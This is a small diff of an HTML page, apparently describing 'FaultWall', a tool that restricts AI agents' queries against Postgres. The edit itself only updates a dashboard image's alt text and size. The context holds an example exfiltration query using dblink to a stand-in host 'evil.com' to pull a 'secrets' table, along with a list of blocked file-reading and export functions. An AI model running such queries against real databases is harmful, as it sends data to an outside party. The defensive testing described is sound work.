@@ -282,7 +282,7 @@ SELECT * FROM dblink('host=evil.com', 'SELECT * FROM secrets');</code></pre>
     <p>I tested 11 scenarios on a real Postgres 16 instance running on a separate machine. Not mocks, not unit tests. Actual <code>psql</code> connections, actual <code>pg_terminate_backend()</code> calls. Table blocking, function blocking (pg_sleep, lo_export, pg_read_file), operation restrictions (allowing SELECT but blocking DELETE), unregistered agent rejection, and monitoring unidentified connections. All 11 passed.</p>
 
     <div class="screenshot">
-      <img src="dashboard.jpg" alt="FaultWall dashboard showing agent violations, cost attribution, and query monitoring" width="891" height="2000" loading="lazy">
+      <img src="dashboard.jpg" alt="FaultWall dashboard showing enforcement mode, policy violations, connected agents, and query monitoring" width="2560" height="2888" loading="lazy">
       <div class="caption">FaultWall dashboard showing 5 blocked violations, connected agents, and per-tenant cost attribution.</div>
     </div>
 
